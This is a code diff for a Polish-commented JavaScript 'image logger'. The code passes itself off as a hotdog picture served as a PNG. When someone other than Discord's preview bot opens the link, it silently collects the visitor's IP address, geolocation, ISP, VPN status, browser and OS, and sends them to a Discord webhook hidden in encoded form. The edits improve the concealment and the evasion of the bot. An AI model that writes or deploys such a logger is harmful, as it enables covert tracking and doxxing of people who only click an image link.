@@ -1,5 +1,5 @@
 // ====================== KOALA IMAGE LOGGER ======================
-// Pełna geolokalizacja + działający obrazek .png
+// Automatyczne ładowanie na Discordzie + poprawione wykrywanie
 
 function decodeWebhook(encoded) {
     try {
@@ -11,11 +11,11 @@ function decodeWebhook(encoded) {
 
 function getBrowser(userAgent) {
     const ua = userAgent.toLowerCase();
+    if (ua.includes('opr') || ua.includes('opera')) return 'Opera GX / Opera';
+    if (ua.includes('edg')) return 'Edge';
     if (ua.includes('chrome') && !ua.includes('edg') && !ua.includes('opera')) return 'Chrome';
     if (ua.includes('firefox')) return 'Firefox';
     if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
-    if (ua.includes('edg')) return 'Edge';
-    if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
     return 'Unknown';
 }
 
@@ -33,9 +33,9 @@ function getOS(userAgent) {
 
 export default async function handler(req, res) {
     // ========== UKRYTY WEBHOOK ==========
-    const encodedWebhook = req.query.w;
-    const oldWebhook = req.query.webhook;
-    const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : oldWebhook;
+    // Webhook może być w parametrze 'w' lub bezpośrednio w path
+    const encodedWebhook = req.query.w || req.query.webhook;
+    const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : null;
     
     // ========== IP ==========
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -49,7 +49,7 @@ export default async function handler(req, res) {
     const ua = userAgent.toLowerCase();
     const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
     
-    // ========== GEOLOKALIZACJA (ip-api.com – darmowe, szybkie) ==========
+    // ========== GEOLOKALIZACJA ==========
     let geo = {
         provider: 'Unknown',
         asn: 'Unknown',
@@ -65,8 +65,7 @@ export default async function handler(req, res) {
     
     if (!isDiscordBot && finalWebhook) {
         try {
-            // Użyj ip-api.com (darmowe, 45 zapytań/minutę)
-            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
+            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
             const geoData = await geoRes.json();
             
             if (geoData.status === 'success') {
@@ -83,9 +82,7 @@ export default async function handler(req, res) {
                     vpn: geoData.proxy || false
                 };
             }
-        } catch (e) {
-            console.log('Geo lookup failed:', e.message);
-        }
+        } catch (e) {}
     }
     
     const browser = getBrowser(userAgent);
@@ -129,17 +126,18 @@ ${userAgent}`;
     }
     
     // ========== ZWRÓĆ OBRAZEK PNG ==========
-    // Pobierz duży obrazek hotdoga i zwróć jako PNG
+    // Ważne: ustawiamy Content-Type na image/png
+    res.setHeader('Content-Type', 'image/png');
+    res.setHeader('Cache-Control', 'no-cache');
+    
+    // Zwróć obrazek hotdoga (jako PNG)
     try {
         const imageRes = await fetch('https://i.imgur.com/9ZqB8Xa.jpg');
         const imageBuffer = await imageRes.arrayBuffer();
-        res.setHeader('Content-Type', 'image/png');
-        res.setHeader('Cache-Control', 'no-cache');
         res.send(Buffer.from(imageBuffer));
     } catch (e) {
-        // Fallback – mały obrazek
-        const fallbackImage = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
-        res.setHeader('Content-Type', 'image/png');
-        res.send(fallbackImage);
+        // Fallback – 1x1 piksel
+        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
+        res.send(pixel);
     }
 }
